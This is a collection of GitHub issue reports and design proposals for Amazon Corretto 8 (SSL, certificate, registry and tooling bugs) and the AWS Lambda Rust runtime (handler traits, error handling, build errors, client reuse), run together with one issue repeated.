        at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.buildHttpRequest(AbstractGoogleClientRequest.java:422)
        at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:541)
        at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:474)
        at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:591)
        at com.google.cloud.bigquery.spi.v2.HttpBigQueryRpc.create(HttpBigQueryRpc.java:204)
        ... 10 more
Caused by: javax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
        at sun.security.ssl.Alerts.getSSLException(Alerts.java:192)
        at sun.security.ssl.SSLSocketImpl.fatal(SSLSocketImpl.java:1946)
        at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:316)
        at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:310)
        at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1639)
        at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:223)
        at sun.security.ssl.Handshaker.processLoop(Handshaker.java:1037)
        at sun.security.ssl.Handshaker.process_record(Handshaker.java:965)
        at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1064)
        at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1367)
        at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1395)
        at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1379)
        at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559)
        at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185)
        at sun.net.www.protocol.http.HttpURLConnection.getOutputStream0(HttpURLConnection.java:1340)
        at sun.net.www.protocol.http.HttpURLConnection.getOutputStream(HttpURLConnection.java:1315)
        at sun.net.www.protocol.https.HttpsURLConnectionImpl.getOutputStream(HttpsURLConnectionImpl.java:264)
        at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:108)
        at com.google.api.client.http.javanet.NetHttpRequest.execute(NetHttpRequest.java:79)
        at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:996)
        at com.google.auth.oauth2.ServiceAccountCredentials.refreshAccessToken(ServiceAccountCredentials.java:429)
        ... 20 more
Caused by: sun.security.validator.ValidatorException: PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
        at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:397)
        at sun.security.validator.PKIXValidator.engineValidate(PKIXValidator.java:302)
        at sun.security.validator.Validator.validate(Validator.java:262)
        at sun.security.ssl.X509TrustManagerImpl.validate(X509TrustManagerImpl.java:330)
        at sun.security.ssl.X509TrustManagerImpl.checkTrusted(X509TrustManagerImpl.java:237)
        at sun.security.ssl.X509TrustManagerImpl.checkServerTrusted(X509TrustManagerImpl.java:132)
        at sun.security.ssl.ClientHandshaker.serverCertificate(ClientHandshaker.java:1621)
        ... 36 more
Caused by: sun.security.provider.certpath.SunCertPathBuilderException: unable to find valid certification path to requested target
        at sun.security.provider.certpath.SunCertPathBuilder.build(SunCertPathBuilder.java:141)
        at sun.security.provider.certpath.SunCertPathBuilder.engineBuild(SunCertPathBuilder.java:126)
        at java.security.cert.CertPathBuilder.build(CertPathBuilder.java:280)
        at sun.security.validator.PKIXValidator.doBuild(PKIXValidator.java:392)
        ... 42 more


` Thank you for taking the time to help improve OpenJDK and Corretto.

If your request concerns a security vulnerability then please report it by email to aws-security@amazon.com instead of here.
(You can find more information regarding security issues at https://aws.amazon.com/security/vulnerability-reporting/.)

Otherwise, if your idea concerns OpenJDK 8
and is not specific to Corretto 8
we ask that you propose it to the OpenJDK community.
Depending on your contributor status for OpenJDK,
please use the [JDK bug system]() or
the appropriate [mailing list](http://mail.openjdk.java.net/mailman/listinfo)
for the given problem area or update project [jdk8u-dev](http://mail.openjdk.java.net/mailman/listinfo/jdk8u-dev).

If your proposal is specific to Corretto 8,
then you are in the right place.
Please proceed with the following.

### Is your feature request related to a problem?
Best way to track latest release/updates/patches for Corretto 8

### Describe a solution you would like
Update notification for users with Corretto installed in registry

### Additional context
At the moment it seems, We have to check at the website to see, if there was an updates/fixes or patches available since the last version. 
 # Describe the bug
Currently, the provided Linux packages (deb and rpm) include bundled CA certificates. For example, the rpm install the file `/usr/lib/jvm/java-1.8.0-amazon-corretto/jre/lib/security/cacerts`

However, it should be configured like the distribution packaged Java (ex `java-1.8.0` on Fedora / Amazon Linux) to use the operating system provided CA certificates by symlinking `/usr/lib/jvm/java-1.8.0-amazon-corretto/jre/lib/security/cacerts` -> `/etc/pki/ca-trust/extracted/java/cacerts`

### To Reproduce
Steps and (source) code to reproduce the behavior.
1. `docker run -it amazoncorretto:8` (which is just amazonlinux with the rpm installed, see Dockerfile at https://github.com/corretto/corretto-8-docker/blob/cd7c7563f35cc12cf50a9a418e5ecaa73810a8e8/Dockerfile)
2. Note that `/usr/lib/jvm/java-1.8.0-amazon-corretto/jre/lib/security/cacerts` is a file, not a symlink

### Expected behavior
When using the rpm, `/usr/lib/jvm/java-1.8.0-amazon-corretto/jre/lib/security/cacerts` should be a symlink to `/etc/pki/ca-trust/extracted/java/cacerts`
When using the deb, a similar link should exist. 

### Screenshots
If applicable, add screenshots to help explain your problem.
n/a

### Platform information
    OS: Amazon Linux 2
    Version build 1.8.0_222-b10

### Additional context
I believe that solving this issue is a prerequisite for upstreaming Corretto into Linux distributions which is tracked at https://github.com/corretto/corretto-8/issues/114 ### Describe the bug
Running most recent Eclipse IDE (2019-03) with the most recent Correto-8 JDK on Mac causes many 'spinning-cursor-beachballs', approx. 1 every minute or so.

### To Reproduce
In eclipse.ini add following two lines at top of file:
  -vm
  /Library/Java/JavaVirtualMachines/amazon-corretto-8.jdk/Contents/Home/bin/
then just use the IDE normally to edit, compile and debug Java code.

### Expected behavior
Running with Oracle's JDK (for example 1.8.0_192)  produces beachballs at the 'normal' rate for Eclipse IDE, perhaps 1 or 2 a day.

### Screenshots
sorry, can't snapshot the spinning cursor

### Platform information
    OS: macOS
    Version: OpenJDK Runtime Environment Corretto-8.212.04.2 (build 1.8.0_212-b04)

### Additional context
I believe with Oracle's JDK the setting "-XstartOnFirstThread" is supposed to manage this behaviour
 ### Describe the bug
When installing the JDK MSI (amazon-corretto-8.212.04.2-windows-x64.msi), the registry keys are created (HKEY_LOCAL_MACHINE\SOFTWARE\JavaSoft\Java Runtime Environment).  However, the sub-key below this root that is being made containing the version number is not in the correct format.  The sub-key is "1.8.0.212" when the Oracle Java method is "1.8.0_212".  This is causing some application to be unable to determine if the JRE is installed and fails to run.  Renaming the key to use the underscore instead of the period allows the applications to function properly.

### To Reproduce
Install JDK MSI and look at the registry key name.  Modify the registry key name to resolve.

### Expected behavior
Applications using Java Runtime Environment should launch properly if they are using the registry keys to check for version of Java installed.

### Screenshots
Invalid registry key format:
![image](https://user-images.githubusercontent.com/50115760/56915103-515bc080-6a7b-11e9-917e-1d16841cf23f.png)

Correct registry key format:
![image](https://user-images.githubusercontent.com/50115760/56915205-89fb9a00-6a7b-11e9-81cc-66a0381a09f0.png)

### Platform information
    OS: Windows 10 x64
    Version: amazon-corretto-8.212.04.2-windows-x64.msi

### Additional context
This is just going to impact poorly written applications, but is causing issues nonetheless.
 ### Describe the bug
Both Windows and OS X JDK builds of  8u202 does not include jmc and jvisualvm

### To Reproduce
Install Corretto 8u202. Check available tools and notice that jmc and jvisualvm are missing.

### Expected behavior
Tools should be available

### Screenshots
```
$  ls -l /Library/Java/JavaVirtualMachines/amazon-corretto-8.jdk/Contents/Home/bin/
total 7408
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 appletviewer
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 extcheck
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 idlj
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jar
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jarsigner
-rwxr-xr-x  1 root  wheel   93556 Jan 24 03:21 java
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 javac
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 javadoc
-rwxr-xr-x  1 root  wheel    2293 Jan 24 03:08 javafxpackager
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 javah
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 javap
-rwxr-xr-x  1 root  wheel    2293 Jan 24 03:08 javapackager
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jcmd
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jconsole
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jdb
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jdeps
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jhat
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jinfo
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jjs
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jmap
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jps
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jrunscript
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jsadebugd
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jstack
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jstat
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 jstatd
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 keytool
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 native2ascii
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 orbd
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 pack200
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 policytool
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 rmic
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 rmid
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 rmiregistry
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 schemagen
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 serialver
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 servertool
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 tnameserv
-rwxr-xr-x  1 root  wheel  106768 Jan 24 03:21 unpack200
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 wsgen
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 wsimport
-rwxr-xr-x  1 root  wheel   93620 Jan 24 03:21 xjc
```

### Platform information
Windows Server 2016
OpenJDK 64-Bit Server VM Corretto-8.202.08.2 (build 25.202-b08, mixed mode)

and

OS X 10.14.3
OpenJDK 64-Bit Server VM Corretto-8.202.08.2 (build 25.202-b08, mixed mode)

### Additional context
Windows version downloaded directly from Amazon Corretto website, OS X version by using homebrew package
 Hi

I need update time zone data (tzdb,dat). And I tried with tzupdater.jar priviede by Oracle.
But it make below errors.

shell> java -jar tzupdater.jar -V
tzupdater version 2.3.0-b01
JRE tzdata version: tzdata2019c
java.lang.NullPointerException
Exception in thread "main" com.sun.tools.tzupdater.TzRuntimeException: java.lang.NullPointerException
        at com.sun.tools.tzupdater.TimezoneUpdater.main(TimezoneUpdater.java:705)
Caused by: java.lang.NullPointerException
        at com.sun.tools.tzupdater.TimezoneUpdater.run(TimezoneUpdater.java:237)
        at com.sun.tools.tzupdater.TimezoneUpdater.main(TimezoneUpdater.java:686)

Is there alternative way to update time zone data ? 

Thanks. ### Describe the bug
JVM crashes or PC hangs if app tries to capture snap of screen. 

### To Reproduce
Try capturing screen with Robot class and createScreenCapture  method in Fedora. 

### Expected behavior
Wayland mode prevents app from taking snap. But, JVM should not crash.

### Platform information
    OS: [Fedora]

### Additional context
https://fedoraproject.org/wiki/How_to_debug_Wayland_problems#Screen_capture_is_not_available_with_usual_apps

https://bugs.openjdk.java.net/browse/JDK-8171000 (This solved crash issue in Open JDK)

https://bugs.openjdk.java.net/browse/JDK-8196571
 I was expecting that installation of 8.212 would remove 8.202. 

Upgrade code is the same, so it should, but 8.202 remains. 
it is work well with jdk8u181 and openjdk （build 1.8.0_222）。
it doesn't work with corretto-8 ，although i set headless true .

I use following code generate  verification code:

BufferedImage bim = new BufferedImage(width, height,
				BufferedImage.TYPE_BYTE_INDEXED);
		Graphics2D graphics = bim.createGraphics();
		Color c = getRandColor(200, 250);
		graphics.setColor(c);
		graphics.fillRect(0, 0, bim.getWidth(), bim.getHeight());
		graphics.setColor(Color.black);
		Font font = getFont();
		graphics.setFont(font);
		graphics.setColor(this.getRandColor());
		graphics.drawString(textCode, 8, 25);  // **exception: java.lang.NoClassDefFoundError: Could not initialize class sun.awt.X11FontManager**
 Similar to https://github.com/corretto/corretto-8/issues/117, let's document how to build on Mac. Similar to https://github.com/corretto/corretto-8/issues/117, let's document how to build on Windows. From https://github.com/corretto/corretto-8/issues/64, @tanayjha is interested in experimenting with font configurations. Let's publish how we build on Linux so that he can iterate on his side.
<---------->
156752158
In [a precursor project there was this question](https://github.com/srijs/rust-aws-lambda/issues/28) about using Rust with Lambda@Edge (Lambda + CloudFront).
It looks like Lambda@Edge is [still limited to nodejs](https://docs.aws.amazon.com/AmazonCloudFront/latest/DeveloperGuide/lambda-requirements-limits.html#lambda-requirements-lambda-function-configuration).  Any idea if Amazon plans to expand supported runtimes?  Or, worst-case, is there any interest in this runtime to work via nodejs?
 At the moment the AWS Lambda rust runtime is composed of two crates: The [Runtime Client](https://github.com/awslabs/aws-lambda-rust-runtime/tree/master/lambda-runtime-client) and the [Runtime](https://github.com/awslabs/aws-lambda-rust-runtime/tree/master/lambda-runtime). The runtime client implements a client SDK to the [Lambda runtime APIs](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html), taking care of all the communication to the runtime endpoint to receive new events, send responses and errors. The runtime implements the “main loop” of a function's lifecycle: call `/next` to receive the next event, invoke the handler, and then post responses or errors to the relevant endpoints. The runtime client SDK only deals with byte slices and does not understand types; the runtime crate, on the other hand, expects the event and response types to be serializable/deserializable with Serde.

We have received requests to handle multiple event types in the same Lambda function (#29) as well as abstracted implementations that abstract the event into a well-known type in rust, such as the HTTP crate (#18). To make it easier to extend the runtime and support future use-cases, we propose to split the Rust Lambda runtime into three separate crates:

1. The existing runtime Client SDK - follows the current behavior and only deals with byte slices
2. The new **runtime-core** - implements the main event loop of receiving events from the `/next` endpoint and posting responses. Expects a handler that only deals with byte slices.
3. The runtime - the current, typed, implementation of the runtime will depend on the **runtime-core** and wraps the given typed handler into its own byte-slice-based wrapper for the runtime-core.

The runtime-core crate will declare this handler type:

```rust
pub trait Handler<Error> {
where Error: Display + ErrorExt + Send + Sync {
    fn run(&mut self, event: Vec<u8>, ctx: Context) -> Result<Vec<u8>, Error>;
}
```

The typed runtime will declare the same handler type as now and wrap the run method to perform the serialization/deserialization before passing data to the core crate.
 Currently, the Lambda Rust runtime declares a [`HandlerError`](https://github.com/awslabs/aws-lambda-rust-runtime/blob/master/lambda-runtime/src/error.rs#L125) type that developers can use to return an error from their handler method. While this approach works, it forces developers to write more verbose code to handle all errors and generate the relevant `HandlerError` objects. Developers would like to return errors automatically using the `?` operator (#23). 

For example:

```rust
fn my_handler(e: CustomEvent, c: lambda::Context) -> Result<CustomOutput, Error> {
    let i = event.age.parse::<u8>?;
    ...
}
```

In an error response, the [Lambda runtime API](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html#runtimes-api-invokeerror) expects two parameters: `errorType` and `errorMessage`. Optionally, we can also attach a stack trace to the error.

```json
{
    "errorMessage" : "Error parsing age data.",
    "errorType" : "InvalidAgeException"
}
```

To generate an error message field we need the `Err` variant from the handler `Result` to support the `Display` trait. This allows us to support any `Display` type in the result - `Error` types inherently supports `Display` too. However, we cannot identify a way to automatically generate the error type field given a `Display`-compatible object that uses stable features. To address this, we plan to introduce a new trait in the runtime: 

```rust
pub trait ErrorExt {
    fn error_type(&self) -> &str;
}
```

We'd like to  deprecate this trait in the future and rely on the type name intrinsic (which is currently blocked on specialization). For context, see [#1428](https://github.com/rust-lang/rfcs/issues/1428).

The name ErrorExt comes from the [extension trait conventions RFC](https://github.com/rust-lang/rfcs/blob/1f5d3a9512ba08390a2226aa71a5fe9e277954fb/text/0445-extension-trait-conventions.md). Based on feedback, we are open to changing this.

The runtime crate itself will provide the implementation of the `ErrorExt` trait for the most common errors in the standard library. Developers will have to implement the trait themselves in their own errors. We may consider adding a procedural macro to the runtime crate to automatically generate the trait implementation.

In summary, the proposed changes are:

1. The handler type will accept any object that implements `Display` and `ErrorExt` in its `Err` variant.
2. The runtime crate will use the `Display` trait to extract an error message and use the `ISO-8859-1` charset.
3. The runtime crate will call the `error_type()` function to get the value for the `errorType` field.
4. If the `RUST_BACKTRACE` environment variable is set to `1`, the runtime will use the [backtrace](https://crates.io/crates/backtrace) crate to collect a stack trace as soon as the error is received.

The new handler type definition will be:

```rust
pub trait Handler<Event, Output, Error> 
where 
    Event: From<Vec<u8>>,
    Output: Into<Vec<u8>>,
    Error: Display + ErrorExt + Send + Sync,
{
    fn run(&mut self, event: Event, ctx: Context) -> Result<Output, Error>;
}
```

 When using `lambda_runtime` it seems to be hardcoded that one's lambda handler will take JSON as input and output in JSON and it serialises the structures using `serde_json`. Is it possible to configure this and esp. be able to return binary data with a specified mime type instead of "application/json"?

This would be most useful for lambdas for example responding with image/png, image/jpg and other binary types.

I also tested using `lambda-runtime-client` directly as then I have control over the deserialising of the request and are able to directly output a binary blob as the response. But the header for the response is fixed to use `const API_CONTENT_TYPE: &str = "application/json";`.

Have there been any thoughts of how to support and handle binary responses with other mime types? The examples for using the Rust Lambda runtime require additional calls around error handling that require access to the `Context` object.

Unfortunately, that breaks Rust ergonomics for error handing, that ordinarily would use `?` and map custom errors to `HandlerError` through an `impl From` (which doesn't have a reference to the `Context` struct.

Ideally, I could return my own error types, and either have the runtime take care of supplying context, with perhaps some place to inject logging, etc. into the error handing flow.

In practice, in the short term, I'm breaking out all actions that can return a `Result` into a separate module, because even trivial activities get complicated quickly if you want to inject error handing with access to `Context`. docs.rs makes it easy to host your rustdocs for free https://docs.rs/lambda_runtime/0.1.0/lambda_runtime/  it also offers a quality of life feature with its [badge urls](https://docs.rs/lambda_runtime/badge.svg) Since there's one central readme for this project (with a list of modules and descriptions at the top) it make make sense to add a badge for each there I wanted to open up an issue for discussion first I thought maybe it was something in my code but I get the same panic with the example here:  https://docs.rs/crate/lambda_runtime/0.2.0

```
START RequestId: 967aad3f-eaaa-4946-bc51-dc717f81aa71 Version: $LATEST
thread 'main' panicked at 'Could not retrieve next event', /Users/redacted/.cargo/registry/src/github.com-1ecc6299db9ec823/lambda_runtime_core-0.1.0/src/runtime.rs:266:17
stack backtrace:
   0: std::sys::unix::backtrace::tracing::imp::unwind_backtrace
             at src/libstd/sys/unix/backtrace/tracing/gcc_s.rs:49
   1: std::sys_common::backtrace::_print
             at src/libstd/sys_common/backtrace.rs:71
   2: std::panicking::default_hook::{{closure}}
             at src/libstd/sys_common/backtrace.rs:59
             at src/libstd/panicking.rs:211
   3: std::panicking::default_hook
             at src/libstd/panicking.rs:227
   4: std::panicking::rust_panic_with_hook
             at src/libstd/panicking.rs:491
   5: std::panicking::begin_panic
   6: <lambda_runtime_core::runtime::Runtime<Function, EventError>>::get_next_event
   7: <lambda_runtime_core::runtime::Runtime<Function, EventError>>::get_next_event
   8: <lambda_runtime_core::runtime::Runtime<Function, EventError>>::get_next_event
   9: <lambda_runtime_core::runtime::Runtime<Function, EventError>>::get_next_event
  10: <lambda_runtime_core::runtime::Runtime<Function, EventError>>::get_next_event
  11: lambda_runtime_core::runtime::start_with_config
  12: bootstrap::main
  13: std::rt::lang_start::{{closure}}
  14: std::panicking::try::do_call
             at src/libstd/rt.rs:59
             at src/libstd/panicking.rs:310
  15: __rust_maybe_catch_panic
             at src/libpanic_unwind/lib.rs:102
  16: std::rt::lang_start_internal
             at src/libstd/panicking.rs:289
             at src/libstd/panic.rs:398
             at src/libstd/rt.rs:58
  17: main
END RequestId: 967aad3f-eaaa-4946-bc51-dc717f81aa71
REPORT RequestId: 967aad3f-eaaa-4946-bc51-dc717f81aa71	Duration: 1050.16 ms	Billed Duration: 1100 ms 	Memory Size: 128 MB	Max Memory Used: 26 MB	
RequestId: 967aad3f-eaaa-4946-bc51-dc717f81aa71 Error: Runtime exited with error: exit status 101
Runtime.ExitError
``` Hi,

Is there a canonical way to reuse valuable objects between calls to the handler, for example a database client ? I have considered : 
- a global variables with `lazy_static` or a call to `Once`, but it feels like a hack
- passing a parameter to the handler via `lambda!` but it's not implemented AFAIK
- building a custom runtime upon with this library but it seems like reinventing the wheel just to pass a parameter

Thank you for this project, it's awesome ! :) There is a typo within the AWS CLI deploy instructions in the README.

`--zip-file file://./lambda.zip \` should be `  --zip-file fileb://./lambda.zip \` The `lambda-http` crate doesn't seem to be published on crates.io, which means the only way to use it in a project is to reference this git repo directly in `Cargo.toml`, which is not exactly ideal.

i.e., I got it to build with
```
[dependencies.lambda_http]
git = "https://github.com/awslabs/aws-lambda-rust-runtime"
```
but it would be much nicer to specify it as a regular crates.io dependency.

Are there any plans to publish the `lambda-http` crate? Receiving this error when building crate fresh from crates.io.
   
```
Compiling lambda_http v0.1.0
error[E0252]: the name `Deserialize` is defined multiple times
  --> /home/bruces/.cargo/registry/src/github.com-1ecc6299db9ec823/lambda_http-0.1.0/src/request.rs:17:5
   |
15 |     Deserialize, Deserializer,
   |     ----------- previous import of the macro `Deserialize` here
16 | };
17 | use serde_derive::Deserialize;
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^ `Deserialize` reimported here
   |
   = note: `Deserialize` must be defined only once in the macro namespace of this module
help: you can use `as` to change the binding name of the import
   |
17 | use serde_derive::Deserialize as OtherDeserialize;
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

error: aborting due to previous error

For more information about this error, try `rustc --explain E0252`.
error: Could not compile `lambda_http`.
```

Looking at the source [here](https://github.com/awslabs/aws-lambda-rust-runtime/blob/master/lambda-http/src/request.rs) you can see the following on line 15 and 17 respectively:

```
use serde::de::{Deserialize, Deserializer, Error as DeError, MapAccess, Visitor};
use serde_derive::Deserialize;
```
Deleting line 17 appears to correct the issue.

Looking at [PR 62](https://github.com/awslabs/aws-lambda-rust-runtime/pull/62), it may be resolved there, but I'm willing to submit a smaller PR to just fix this if desired. Receiving this error when building crate fresh from crates.io.
   
```
Compiling lambda_http v0.1.0
error[E0252]: the name `Deserialize` is defined multiple times
  --> /home/bruces/.cargo/registry/src/github.com-1ecc6299db9ec823/lambda_http-0.1.0/src/request.rs:17:5
   |
15 |     Deserialize, Deserializer,
   |     ----------- previous import of the macro `Deserialize` here
16 | };
17 | use serde_derive::Deserialize;
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^ `Deserialize` reimported here
   |
   = note: `Deserialize` must be defined only once in the macro namespace of this module
help: you can use `as` to change the binding name of the import
   |
17 | use serde_derive::Deserialize as OtherDeserialize;
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^

error: aborting due to previous error

For more information about this error, try `rustc --explain E0252`.
error: Could not compile `lambda_http`.
```

Looking at the source [here](https://github.com/awslabs/aws-lambda-rust-runtime/blob/master/lambda-http/src/request.rs) you can see the following on line 15 and 17 respectively:

```
use serde::de::{Deserialize, Deserializer, Error as DeError, MapAccess, Visitor};
use serde_derive::Deserialize;
```
Deleting line 17 appears to correct the issue.

Looking at [PR 62](https://github.com/awslabs/aws-lambda-rust-runtime/pull/62), it may be resolved there, but I'm willing to submit a smaller PR to just fix this if desired. Being very new to Rust in general I was wondering how I could share [rusoto](https://github.com/rusoto/rusoto) clients across multiple Lambda invocations. In particular I am trying to cache an IoT Data client for function invocations which happen several times per minute. Coming from Typescript where caching in global scope solves the issue, I can't figure out how to do it in Rust. Apologies if this should be out of scope for this project, but I couldn't find an answer anywhere else.

In this code I would like to cache `iot_data_client` for further invocations:
```
use lambda_runtime::{error::HandlerError, lambda, Context};
use serde_derive::{Serialize, Deserialize};
use rusoto_iot_data::{IotData, IotDataClient, PublishRequest};
use bytes::Bytes;
use rusoto_core::Region;

#[derive(Deserialize, Clone)]
struct CustomEvent {
    first_name: String,
    last_name: String,
}

#[derive(Serialize, Clone)]
struct CustomOutput {
    message: String,
}

fn main() {
    lambda!(my_handler);
}

fn my_handler(e: CustomEvent, _ctx: Context) -> Result<CustomOutput, HandlerError> {
    if e.first_name == "" {
        panic!("Empty first name");
    }
    let request = PublishRequest {
        payload: Some(Bytes::from_static(b"Hello Rust!")),
        topic: String::from("rust"),
        qos: Some(1),
    };
    // How can I cache this?
    let iot_data_client = IotDataClient::new(Region::EuCentral1);
    
    match iot_data_client.publish(request).sync() {
        Ok(_result) => {
            Ok(CustomOutput{
                message: format!("Hello, {}!", e.first_name),
            })
        },
        Err(error) => {
            panic!(format!("Error: {:?}", error))
        }
    }   
}
``` Being very new to Rust in general I was wondering how I could share [rusoto](https://github.com/rusoto/rusoto) clients across multiple Lambda invocations. In particular I am trying to cache an IoT Data client for function invocations which happen several times per minute. Coming from Typescript where caching in global scope solves the issue, I can't figure out how to do it in Rust. Apologies if this should be out of scope for this project, but I couldn't find an answer anywhere else. I got below error when building the lambda_http example code

```
use lambda_http::{lambda, IntoResponse, Request, RequestExt};
use lambda_runtime::{Context, error::HandlerError};

fn main() {
    lambda!(hello)
}

fn hello(
    request: Request,
    _ctx: Context
) -> Result<impl IntoResponse, HandlerError> {
    Ok(format!(
        "hello {}",
        request
            .query_string_parameters()
            .get("name")
            .unwrap_or_else(|| "stranger")
    ))
}
```
according to issue #87 , I chose to fetch lambda_http crate from git address
the dependencies in Cargo.toml are:
```
lambda_runtime = "0.2"
lambda_http = {git = "https://github.com/awslabs/aws-lambda-rust-runtime"}
```

error message:
```
type mismatch in function arguments

expected signature of `fn(http::request::Request<lambda_http::body::Body>, lambda_runtime_core::context::Context) -> _`

note: required because of the requirements on the impl of `lambda_http::Handler<_>` for `fn(http::request::Request<lambda_http::body::Body>, lambda_runtime_core::context::Context) -> std::result::Result<impl lambda_http::response::IntoResponse, lambda_runtime_errors::HandlerError> {hello}`
note: required by `lambda_http::start`rustc(E0631)
<::lambda_http::lambda macros>(1, 27): expected signature of `fn(http::request::Request<lambda_http::body::Body>, lambda_runtime_core::context::Context) -> _`
main.rs(8, 1): found signature of `fn(http::request::Request<lambda_http::body::Body>, lambda_runtime_core::context::Context) -> _`
```

It will not receive such error If I change the lambda_http version to 0.1
But in more practical project, serde::Deserialize (#87 ) will be introduced.

Is there any workaround? or is there any example to return the http response via lambda_runtime crate only? Thanks in advance Are there any disadvantages to making `lambda_http::LambdaRequest` public?  

For testing http handlers, I would like to deserialize json to a `http::Request`

I am essentially after performing something akin to https://github.com/awslabs/aws-lambda-rust-runtime/blob/master/lambda-http/src/request.rs#L361. (Pulled from #94)

I wonder if we can support that through an optional extension for customers that _do_ care about this. To that end, I've been talking to @carllerche—he might be able to comment on this more—about the usage of Tower in underlying of the Lambda runtime, and my current thinking is that we can provide _several_ valid handler signatures as implemented by specialized tower services and a corresponding `Into<Service>` (for context, [this is the foundational Service trait](https://docs.rs/tower-service/0.2.0/tower_service/trait.Service.html)) that'll be executed by the the Lambda runtime itself. Given this definition, we can provide several specialized services along the lines of:

- `Service<(http::Request<T>, Context)> -> http::Response<U>`
- `Service<(http::Request<T>, Context)> -> Result<http::Response<U>, HandlerError>`
- `Service<(aws_lambda_events::event::sqs::SqsEvent, Context)> -> U`
- `Service<(aws_lambda_events::event::sqs::SqsEvent, Context)> -> Result<U, HandlerError>`

Note: _each_ service function signature would be implemented in terms of a sealed trait similar to [`HttpService`](https://github.com/tower-rs/tower-http/blob/6d7a9fdc8e2f7ec047dd24b39a06d5bedddb7ca1/tower-http-service/src/service.rs#L14). 

In the absence of a handler error, the `Into<Service>` implementation would place a default value for `HandlerError`. Handler construction will still be available using a something similar to a [`ServiceFn`](https://github.com/tower-rs/tower/blob/92f4a0cb729a82df01086fa3c8e0e4dd80d36947/tower-service-util/src/service_fn.rs#L5).

To address some potential concerns: 

- We might be able to cut down on our compile times by using more, smaller crates _and_ disabling some of the chunkier features in Tokio, Hyper, and by removing our usage of Failure.
- We can provide support for Tide's [`HttpService`](https://github.com/rustasync/http-service) behind a feature flag. When I deploy the lambda-http basic example and call it via api gateway, I get
```json
{
  "errorMessage": "JsonError: missing field `path` at line 1 column 2",
  "errorType": "JsonError",
  "stackTrace": null
}
```

It seems like having a `Request` in the handler function is not supported.

How can I make a lambda which handles both GET and POST invocations via api gateway? Trying to run locally:

```
cargo run --example=basic
  Downloaded simple-error v0.1.13
   Compiling simple-error v0.1.13
   Compiling simple_logger v1.0.1
   Compiling lambda_runtime v0.2.0 (/Users/walther/git/aws-lambda-rust-runtime/lambda-runtime)
    Finished dev [unoptimized + debuginfo] target(s) in 3.87s
     Running `/Users/walther/git/aws-lambda-rust-runtime/target/debug/examples/basic`
thread 'main' panicked at 'Could not find runtime API env var: environment variable not found', lambda-runtime-core/src/runtime.rs:79:13
note: Run with `RUST_BACKTRACE=1` for a backtrace.
```

